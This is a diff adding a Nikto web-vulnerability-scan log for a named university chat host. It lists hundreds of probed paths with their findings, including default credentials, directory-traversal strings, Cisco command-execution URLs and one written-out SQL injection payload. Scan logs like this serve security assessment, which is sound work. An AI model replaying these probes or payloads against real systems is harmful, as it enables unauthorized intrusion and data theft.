@@ -1,0 +1,606 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: chat-q.it.tuwien.ac.at
++ Target Port: 443
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ GET /: Uncommon header 'strict-transport-security' found, with contents: max-age=31536000
++ GET /: Uncommon header 'x-instance-id' found, with contents: g4ohbvGJgLdhezGXE
++ GET /: Uncommon header 'x-xss-protection' found, with contents: 1
++ GET /: Uncommon header 'content-security-policy' found, with contents: default-src 'self' ; connect-src *; font-src 'self'  data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
++ GET /: Uncommon header 'x-content-type-options' found, with contents: nosniff
++ GET //: File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ GET /robots.txt: "robots.txt" contains 1 entry which should be manually viewed.
++ GET /favicon.ico: Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x5e6bfbbaa9d886afe43fe8b15b3e123c8239d544 
++ GET /kboard/: /kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
++ GET /sshome/: /sshome/: Siteseed pre 1.4.2 has 'major' security problems.
++ GET /tiki/tiki-install.php: /tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ -396: GET /_vti_bin/shtml.exe: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ GET /forums//admin/config.php: /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums//administrator/config.php: /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ -2411: GET /hola/admin/cms/htmltags.php?datei=./sec/data.php: /hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password.
++ -59619: GET /inc/config.php: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ -8204: GET /gb/index.php?login=true: /gb/index.php?login=true: gBook may allow admin login by setting the value 'login' equal to 'true'.
++ GET /getaccess: /getaccess: This may be an indication that the server is running getAccess for SSO
++ GET /vgn/performance/TMT/Report/XML: /vgn/performance/TMT/Report/XML: Vignette CMS admin/maintenance script available.
++ GET /vgn/ppstats: /vgn/ppstats: Vignette CMS admin/maintenance script available.
++ GET /vgn/record/previewer: /vgn/record/previewer: Vignette CMS admin/maintenance script available.
++ GET /vgn/vr/Saving: /vgn/vr/Saving: Vignette CMS admin/maintenance script available.
++ GET /scripts/iisadmin/bdir.htr: /scripts/iisadmin/bdir.htr: This default script shows host info, may allow file browsing and buffer a overrun in the Chunked Encoding data transfer mechanism, request /scripts/iisadmin/bdir.htr??c:\<dirs> . MS02-028. CA-2002-09.
++ GET /scripts/iisadmin/ism.dll: /scripts/iisadmin/ism.dll: Allows you to mount a brute force attack on passwords
++ GET /scripts/tools/ctss.idc: /scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
++ -17654: GET /SiteServer/Admin/commerce/foundation/driver.asp: /SiteServer/Admin/commerce/foundation/driver.asp: Displays a list of installed ODBC drivers.
++ GET /basilix/mbox-list.php3: /basilix/mbox-list.php3: BasiliX webmail application prior to 1.1.1 contains a XSS issue in 'message list' function/page
++ GET /clusterframe.jsp: /clusterframe.jsp: Macromedia JRun 4 build 61650 remote administration interface is vulnerable to several XSS attacks.
++ GET /bb-dnbd/faxsurvey: /bb-dnbd/faxsurvey: This may allow arbitrary command execution.
++ -6591: GET /scripts/Carello/Carello.dll: /scripts/Carello/Carello.dll: Carello 1.3 may allow commands to be executed on the server by replacing hidden form elements. This could not be tested by Nikto.
++ GET /scripts/tools/dsnform: /scripts/tools/dsnform: Allows creation of ODBC Data Source
++ -17657: GET /SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp: /SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp: Used to create, modify, and potentially delete LDAP users and groups.
++ GET /readme.eml: /readme.eml: Remote server may be infected with the Nimda virus.
++ GET /scripts/httpodbc.dll: /scripts/httpodbc.dll: Possible IIS backdoor found.
++ GET /scripts/proxy/w3proxy.dll: /scripts/proxy/w3proxy.dll: MSProxy v1.0 installed
++ GET /SiteServer/admin/: /SiteServer/admin/: Site Server components admin. Default account may be 'LDAP_Anonymous', pass is 'LdapPassword_1'. see http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm
++ GET /pccsmysqladm/incs/dbconnect.inc: /pccsmysqladm/incs/dbconnect.inc: This file should not be accessible, as it contains database connectivity information. Upgrade to version 1.2.5 or higher.
++ GET /iisadmin/: /iisadmin/: Access to /iisadmin should be restricted to localhost or allowed hosts only.
++ GET /PDG_Cart/oder.log: /PDG_Cart/oder.log: Shopping cart software log
++ GET /ows/restricted%2eshow: /ows/restricted%2eshow: OWS may allow restricted files to be viewed by replacing a character with its encoded equivalent.
++ GET /WEB-INF./web.xml: /WEB-INF./web.xml: Multiple implementations of j2ee servlet containers allow files to be retrieved from WEB-INF by appending a '.' to the directory name. Products include Sybase EA Service, Oracle Containers, Orion, JRun, HPAS, Pramati and others. See http://www.westpoint.l
++ GET /view_source.jsp: /view_source.jsp: Resin 2.1.2 view_source.jsp allows any file on the system to be viewed by using \..\ directory traversal. This script may be vulnerable.
++ -6181: GET /officescan/cgi/cgiChkMasterPwd.exe: /officescan/cgi/cgiChkMasterPwd.exe: Trend Micro Officescan allows you to skip the login page and access some CGI programs directly.
++ GET /pbserver/pbserver.dll: /pbserver/pbserver.dll: This may contain a buffer overflow. http://www.microsoft.com/technet/security/bulletin/ms00-094.asp
++ GET /administrator/gallery/uploadimage.php: /administrator/gallery/uploadimage.php: Mambo PHP Portal/Server 4.0.12 BETA and below may allow upload of any file type simply putting '.jpg' before the real file extension.
++ GET /upload.asp: /upload.asp: An ASP page that allows attackers to upload files to server
++ GET /uploadx.asp: /uploadx.asp: An ASP page that allows attackers to upload files to server
++ GET /vgn/ac/delete: /vgn/ac/delete: Vignette CMS admin/maintenance script available.
++ GET /vgn/ac/esave: /vgn/ac/esave: Vignette CMS admin/maintenance script available.
++ GET /vgn/asp/previewer: /vgn/asp/previewer: Vignette CMS admin/maintenance script available.
++ GET /vgn/asp/style: /vgn/asp/style: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/controller: /vgn/jsp/controller: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/jspstatus56: /vgn/jsp/jspstatus56: Vignette CMS admin/maintenance script available.
++ GET /vgn/jsp/previewer: /vgn/jsp/previewer: Vignette CMS admin/maintenance script available.
++ GET /vgn/legacy/edit: /vgn/legacy/edit: Vignette CMS admin/maintenance script available.
++ GET /WEB-INF/web.xml: /WEB-INF/web.xml: JRUN default file found.
++ -35707: GET /forum/admin/wwforum.mdb: /forum/admin/wwforum.mdb: Web Wiz Forums password database found.
++ -52975: GET /guestbook/admin/o12guest.mdb: /guestbook/admin/o12guest.mdb: Ocean12 ASP Guestbook Manager allows download of SQL database which contains admin password.
++ -15971: GET /MIDICART/midicart.mdb: /MIDICART/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server.
++ -53413: GET /shopping400.mdb: /shopping400.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available.
++ GET /adm/config.php: /adm/config.php: PHP Config file may contain database IDs and passwords.
++ GET /contents.php?new_language=elvish&mode=select: /contents.php?new_language=elvish&mode=select: Requesting a file with an invalid language selection from DC Portal may reveal the system path.
++ -53303: GET /simplebbs/users/users.php: /simplebbs/users/users.php: Simple BBS 1.0.6 allows user information and passwords to be viewed remotely.
++ GET /typo3conf/database.sql: /typo3conf/database.sql: Typo3 SQL file found.
++ -53386: GET /vchat/msg.txt: /vchat/msg.txt: VChat allows user information to be retrieved.
++ GET /webcart-lite/orders/import.txt: /webcart-lite/orders/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
++ GET /webcart/carts/: /webcart/carts/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web.
++ GET /webcart/config/clients.txt: /webcart/config/clients.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
++ GET /WS_FTP.ini: /WS_FTP.ini: Can contain saved passwords for FTP sites
++ -17661: GET /SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp: /SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp: Expose various LDAP service and backend configuration parameters
++ -17660: GET /SiteServer/Admin/knowledge/persmbr/VsTmPr.asp: /SiteServer/Admin/knowledge/persmbr/VsTmPr.asp: Expose various LDAP service and backend configuration parameters
++ GET /nsn/fdir.bas:ShowVolume: /nsn/fdir.bas:ShowVolume: You can use ShowVolume and ShowDirectory directly on the Novell server (NW5.1) to view the filesystem without having to log in
++ GET /forum/admin/database/wwForum.mdb: /forum/admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
++ -6196: GET /servlet/SchedulerTransfer: /servlet/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?oid=21999
++ -6196: GET /servlets/SchedulerTransfer: /servlets/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?oid=21999
++ GET /vgn/legacy/save: /vgn/legacy/save: Vignette Legacy Tool may be unprotected. To access this resource, set a cookie called 'vgn_creds' with any value.
++ GET /IDSWebApp/IDSjsp/Login.jsp: /IDSWebApp/IDSjsp/Login.jsp: Tivoli Directory Server Web Administration.
++ GET /quikstore.cgi: /quikstore.cgi: A shopping cart.
++ GET /smg_Smxcfg30.exe?vcc=3560121183d3: /smg_Smxcfg30.exe?vcc=3560121183d3: This may be a Trend Micro Officescan 'backdoor'.
++ GET /nsn/..%5Cutil/chkvol.bas: /nsn/..%5Cutil/chkvol.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/copy.bas: /nsn/..%5Cutil/copy.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/del.bas: /nsn/..%5Cutil/del.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/dsbrowse.bas: /nsn/..%5Cutil/dsbrowse.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/lancard.bas: /nsn/..%5Cutil/lancard.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/rd.bas: /nsn/..%5Cutil/rd.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/ren.bas: /nsn/..%5Cutil/ren.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server 
++ GET /nsn/..%5Cutil/send.bas: /nsn/..%5Cutil/send.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/slist.bas: /nsn/..%5Cutil/slist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cutil/userlist.bas: /nsn/..%5Cutil/userlist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cweb/fdir.bas: /nsn/..%5Cweb/fdir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cwebdemo/env.bas: /nsn/..%5Cwebdemo/env.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /nsn/..%5Cwebdemo/fdir.bas: /nsn/..%5Cwebdemo/fdir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
++ GET /CVS/Entries: /CVS/Entries: CVS Entries file may contain directory listing information.
++ -8450: GET /3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: /3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. BID-7963.
++ -8450: GET /pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: /pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. BID-7963.
++ GET /catalog.nsf: /catalog.nsf: A list of server databases can be retrieved, as well as a list of ACLs.
++ GET /names.nsf: /names.nsf: User names and groups can be accessed remotely (possibly password hashes as well)
++ -31150: GET /USER/CONFIG.AP: /USER/CONFIG.AP: MIPCD configuration information. MIPCD should not have the web interface enabled.
++ GET /cgi-bin/cgi_process: /cgi-bin/cgi_process: WASD reveals a lot of system information in this script. It should be removed.
++ GET /ht_root/wwwroot/-/local/httpd$map.conf: /ht_root/wwwroot/-/local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.
++ GET /local/httpd$map.conf: /local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.
++ GET /852566C90012664F: /852566C90012664F: This database can be read using the replica ID without authentication.
++ GET /mail.box: /mail.box: The mail database can be read without authentication.
++ GET /statrep.nsf: /statrep.nsf: Any reports generated by the admins can be retrieved.
++ GET /Config1.htm: /Config1.htm: This may be a D-Link. Some devices have a DoS condition if an oversized POST request is sent. This DoS was not tested. See http://www.phenoelit.de/stuff/dp-300.txt for info.
++ GET /................../config.sys: /................../config.sys: PWS allows files to be read by prepending multiple '.' characters.  At worst, IIS, not PWS, should be used.
++ GET /..\..\..\..\..\..\temp\temp.class: /..\..\..\..\..\..\temp\temp.class: Cisco ACS 2.6.x and 3.0.1 (build 40) allows authenticated remote users to retrieve any file from the system. Upgrade to the latest version.
++ -4015: GET /jigsaw/: /jigsaw/: Jigsaw server may be installed. Versions lower than 2.2.1 are vulnerable to Cross Site Scripting (XSS) in the error page.
++ GET /cfdocs/expeval/sendmail.cfm: /cfdocs/expeval/sendmail.cfm: Can be used to send email; go to the page and fill in the form
++ GET /ammerum/: /ammerum/: Ammerum pre 0.6-1 had several security issues.
++ GET /cbms/editclient.php: /cbms/editclient.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/
++ GET /cbms/realinv.php: /cbms/realinv.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/
++ GET /ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C: /ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C: This check (A) sets up the next bad blue test (B) for possible exploit. See http://www.badblue.com/down.htm
++ GET /admin/system_footer.php: /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
++ -59646: GET /chat/!nicks.txt: /chat/!nicks.txt: WF-Chat 1.0 Beta allows retrieval of user information.
++ GET /config.php: /config.php: PHP Config file may contain database IDs and passwords.
++ GET /examples/jsp/snp/anything.snp: /examples/jsp/snp/anything.snp: Tomcat servlet gives lots of host information.
++ GET /cgi-bin/handler: /cgi-bin/handler: Comes with IRIX 5.3 - 6.4; allows to run arbitrary commands
++ -29786: GET /admin.php?en_log_id=0&action=users: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ -3233: GET /admin/admin_phpinfo.php4: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
++ -5178: GET /dostuff.php?action=modify_user: /dostuff.php?action=modify_user: Blahz-DNS allows unauthorized users to edit user information. Upgrade to version 0.25 or higher. http://blahzdns.sourceforge.net/
++ -35876: GET /agentadmin.php: /agentadmin.php: Immobilier agentadmin.php contains multiple SQL injection vulnerabilities.
++ GET /sqldump.sql: /sqldump.sql: Database SQL?
++ GET /servlet/SessionManager: /servlet/SessionManager: IBM WebSphere reconfigure servlet (user=servlet, password=manager). All default code should be removed from servers.
++ GET /ip.txt: /ip.txt: This may be User Online from http://www.elpar.net version 2.0, which has a remotely accessible log file.
++ GET /livehelp/: /livehelp/: LiveHelp may reveal system information.
++ -59536: GET /logicworks.ini: /logicworks.ini: web-erp 0.1.4 and earlier allow .ini files to be read remotely.
++ -3204: GET /megabook/files/20/setup.db: /megabook/files/20/setup.db: Megabook guestbook configuration available remotely.
++ GET /order/order_log_v12.dat: /order/order_log_v12.dat: Web shopping system from http://www.io.com/~rga/scripts/cgiorder.html exposes order information, see http://www.mindsec.com/advisories/post2.txt
++ GET /orders/order_log.dat: /orders/order_log.dat: Web shopping system from http://www.io.com/~rga/scripts/cgiorder.html exposes order information, see http://www.mindsec.com/advisories/post2.txt
++ GET /pmlite.php: /pmlite.php: A Xoops CMS script was found. Version RC3 and below allows all users to view all messages (untested). See http://www.phpsecure.org/?zone=pComment&d=101 for details.
++ GET /isapi/count.pl?: /isapi/count.pl?: AN HTTPd default script may allow writing over arbitrary files with a new content of '1', which could allow a trivial DoS. Append /../../../../../ctr.dll to replace this file's contents, for example.
++ GET /logjam/showhits.php: /logjam/showhits.php: Logjam may possibly allow remote command execution via showhits.php page.
++ GET /photo/manage.cgi: /photo/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more.
++ -5374: GET /pub/english.cgi?op=rmail: /pub/english.cgi?op=rmail: BSCW self-registration may be enabled. This could allow untrusted users semi-trusted access to the software. 3.x version (and probably some 4.x) allow arbitrary commands to be executed remotely.
++ -240: GET /scripts/wsisa.dll/WService=anything?WSMadmin: /scripts/wsisa.dll/WService=anything?WSMadmin: Allows Webspeed to be remotely administered. Edit unbroker.properties and set AllowMsngrCmds to 0.
++ -3092: GET /SetSecurity.shm: /SetSecurity.shm: Cisco System's My Access for Wireless. This resource should be password protected.
++ -3092: GET /_vti_pvt/deptodoc.btr: /_vti_pvt/deptodoc.btr: FrontPage file found. This may contain useful information.
++ -3092: GET /_vti_pvt/services.org: /_vti_pvt/services.org: FrontPage file found. This may contain useful information.
++ -28260: POST /_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: /_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: Gives info about server settings.
++ -3092: POST /_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=fals: /_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=fals: We seem to have authoring access to the FrontPage web.
++ -3092: GET /_vti_bin/_vti_aut/dvwssr.dll: /_vti_bin/_vti_aut/dvwssr.dll: This dll allows anyone with authoring privs to change other users file, and may contain a buffer overflow for unauthenticated users. See also : http://www.wiretrip.net/rfp/p/doc.asp?id=45&iface=1. MS00-025.
++ -3092: GET /_vti_bin/_vti_aut/fp30reg.dll: /_vti_bin/_vti_aut/fp30reg.dll: Some versions of the FrontPage fp30reg.dll are vulnerable to a buffer overflow. See http://www.microsoft.com/technet/security/bulletin/ms03-051.asp for details.
++ -473: GET /_vti_pvt/access.cnf: /_vti_pvt/access.cnf: Contains HTTP server-specific access control information. Remove or ACL if FrontPage is not being used.
++ -473: GET /_vti_pvt/writeto.cnf: /_vti_pvt/writeto.cnf: Contains information about form handler result files. Remove or ACL if FrontPage is not being used.
++ -48: GET /doc: /doc: The /doc directory is browsable. This may be /usr/doc.
++ -568: GET /blahb.ida: /blahb.ida: Reveals physical path. To fix: Preferences -> Home directory -> Application & check 'Check if file exists' for the ISAPI mappings. MS01-033.
++ -568: GET /blahb.idq: /blahb.idq: Reveals physical path. To fix: Preferences -> Home directory -> Application & check 'Check if file exists' for the ISAPI mappings. MS01-033.
++ -578: GET /level/16: /level/16: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/16/exec//show/access-lists: /level/16/exec//show/access-lists: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/16/level/16/exec//show/interfaces: /level/16/level/16/exec//show/interfaces: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/16/exec//show: /level/16/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/18/exec//show: /level/18/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/20/exec//show: /level/20/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/24/exec//show: /level/24/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/26/exec//show: /level/26/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/28/exec//show: /level/28/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/32/exec//show: /level/32/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/34/exec//show: /level/34/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/36/exec//show: /level/36/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/40/exec//show: /level/40/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/42/exec//show: /level/42/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/44/exec//show: /level/44/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/48/exec//show: /level/48/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/50/exec//show: /level/50/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/52/exec//show: /level/52/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/56/exec//show: /level/56/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/58/exec//show: /level/58/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/60/exec//show: /level/60/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/64/exec//show: /level/64/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/66/exec//show: /level/66/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/68/exec//show: /level/68/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/72/exec//show: /level/72/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/74/exec//show: /level/74/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/76/exec//show: /level/76/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/80/exec//show: /level/80/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/82/exec//show: /level/82/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/84/exec//show: /level/84/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/88/exec//show: /level/88/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/90/exec//show: /level/90/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/92/exec//show: /level/92/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/96/exec//show: /level/96/exec//show: CISCO HTTP service allows remote execution of commands
++ -578: GET /level/98/exec//show: /level/98/exec//show: CISCO HTTP service allows remote execution of commands
++ -18810: GET /users.lst: /users.lst: LocalWEB2000 users.lst passwords found
++ -3722: GET /lcgi/lcgitest.nlm: /lcgi/lcgitest.nlm: Novell web server shows the server environment
++ -13403: GET /com/novell/webaccess: /com/novell/webaccess: Novell web server allows directory listing
++ -4808: GET /axis-cgi/buffer/command.cgi: /axis-cgi/buffer/command.cgi: Axis WebCam 2400 may allow overwriting or creating files on the system. See http://www.websec.org/adv/axis2400.txt.html for details.
++ -561: GET /server-status: /server-status: This reveals Apache information. Comment out appropriate line in httpd.conf or restrict access to allowed hosts.
++ -1264: GET /publisher/: /publisher/: Netscape Enterprise Server with Web Publishing can allow attackers to edit web pages and/or list arbitrary directories via Java applet. CVE-2000-0237.
++ -2117: GET /cpanel/: /cpanel/: Web-based control panel
++ -2119: GET /shopping/diag_dbtest.asp: /shopping/diag_dbtest.asp: VP-ASP Shopping Cart 5.0 contains multiple SQL injection vulnerabilities. CVE-2003-0560, BID-8159
++ -250: GET /wwwboard/passwd.txt: /wwwboard/passwd.txt: The wwwboard password file is browsable. Change wwwboard to store this file elsewhere, or upgrade to the latest version.
++ -272: GET /msadc/msadcs.dll: /msadc/msadcs.dll: See RDS advisory RFP9902, CVE-1999-1011, MS98-004, MS99-025 RFP-9902 BID-29 (http://www.wiretrip.net/rfp/p/doc.asp/i2/d1.htm), CIAC J-054 http://www.ciac.org/ciac/bulletins/j-054.shtml www.securityfocus.com/bid/529
++ -2735: GET /musicqueue.cgi: /musicqueue.cgi: Musicqueue 1.20 is vulnerable to a buffer overflow. Ensure the latest version is installed (exploit not attempted). http://musicqueue.sourceforge.net/
++ -284: GET /iisadmpwd/aexp2b.htr: /iisadmpwd/aexp2b.htr: Gives domain and system name, may allow an attacker to brute force for access. Also will allow an NT4 user to change his password regardless of the 'user cannot change password' security policy. CVE-1999-0407. BID-4236. BID-2110.
++ -2842: GET //admin/aindex.htm: //admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra '/'. http://packetstorm.linuxsecurity.com/0310-exploits/FlexWATCH.txt
++ -2948: GET /reademail.pl: /reademail.pl: @Mail WebMail 3.52 contains an SQL injection that allows attacker to read any email message for any address registered in the system. Example to append to reademail.pl: ?id=666&folder=qwer'%20or%20EmailDatabase_v.Account='victim@atmail.com&print=1
++ -3: GET /iissamples/exair/search/query.asp: /iissamples/exair/search/query.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. CVE-1999-0449. BID-193.
++ -3092: GET /access-log: /access-log: This might be interesting...
++ -3092: GET /acciones/: /acciones/: This might be interesting...
++ -3092: GET /accounting/: /accounting/: This might be interesting...
++ -3092: GET /adm/: /adm/: This might be interesting...
++ -3092: GET /admin.php3: /admin.php3: This might be interesting...
++ -3092: GET /admin/: /admin/: This might be interesting...
++ -3092: GET /administration/: /administration/: This might be interesting...
++ -3092: GET /Agent/: /Agent/: This might be interesting...
++ -3092: GET /agentes/: /agentes/: This might be interesting...
++ -3092: GET /analog/: /analog/: This might be interesting...
++ -3092: GET /applicattions/: /applicattions/: This might be interesting...
++ -3092: GET /archivar/: /archivar/: This might be interesting...
++ -3092: GET /archives/: /archives/: This might be interesting...
++ -3092: GET /atc/: /atc/: This might be interesting...
++ -3092: GET /backdoor/: /backdoor/: This might be interesting...
++ -3092: GET /banco/: /banco/: This might be interesting...
++ -3092: GET /bbv/: /bbv/: This might be interesting...
++ -3092: GET /bdatos/: /bdatos/: This might be interesting...
++ -3092: GET /buy/: /buy/: This might be interesting...
++ -3092: GET /c/: /c/: This might be interesting...
++ -3092: GET /caja/: /caja/: This might be interesting...
++ -3092: GET /cash/: /cash/: This might be interesting...
++ -3092: GET /ccbill/secure/ccbill.log: /ccbill/secure/ccbill.log: This might be interesting... CC Bill log file?
++ -3092: GET /cert/: /cert/: This might be interesting...
++ -3092: GET /cfdocs/exampleapp/email/application.cfm: /cfdocs/exampleapp/email/application.cfm: This might be interesting...
++ -3092: GET /cfdocs/exampleapp/publish/admin/application.cfm: /cfdocs/exampleapp/publish/admin/application.cfm: This might be interesting...
++ -3092: GET /client/: /client/: This might be interesting...
++ -3092: GET /compra/: /compra/: This might be interesting...
++ -3092: GET /compressed/: /compressed/: This might be interesting...
++ -3092: GET /config/checks.txt: /config/checks.txt: This might be interesting...
++ -3092: GET /connect/: /connect/: This might be interesting...
++ -3092: GET /correo/: /correo/: This might be interesting...
++ -3092: GET /css: /css: This might be interesting...
++ -3092: GET /cuentas/: /cuentas/: This might be interesting...
++ -3092: GET /dan_o.dat: /dan_o.dat: This might be interesting...
++ -3092: GET /data/: /data/: This might be interesting...
++ -3092: GET /dbase/: /dbase/: This might be interesting...
++ -3092: GET /demos/: /demos/: This might be interesting...
++ -3092: GET /devel/: /devel/: This might be interesting...
++ -3092: GET /DMR/: /DMR/: This might be interesting...
++ -3092: GET /down/: /down/: This might be interesting...
++ -3092: GET /downloads/: /downloads/: This might be interesting...
++ -3092: GET /employees/: /employees/: This might be interesting...
++ -3092: GET /enviamail/: /enviamail/: This might be interesting...
++ -3092: GET /excel/: /excel/: This might be interesting...
++ -3092: GET /fbsd/: /fbsd/: This might be interesting...
++ -3092: GET /fileadmin/: /fileadmin/: This might be interesting...
++ -3092: GET /forum/: /forum/: This might be interesting...
++ -3092: GET /fpadmin/: /fpadmin/: This might be interesting...
++ -3092: GET /gfx/: /gfx/: This might be interesting...
++ -3092: GET /graphics/: /graphics/: This might be interesting...
++ -3092: GET /hidden/: /hidden/: This might be interesting...
++ -3092: GET /hitmatic/analyse.cgi: /hitmatic/analyse.cgi: This might be interesting...
++ -3092: GET /hits.txt: /hits.txt: This might be interesting...
++ -3092: GET /hit_tracker/: /hit_tracker/: This might be interesting...
++ -3092: GET /html/: /html/: This might be interesting...
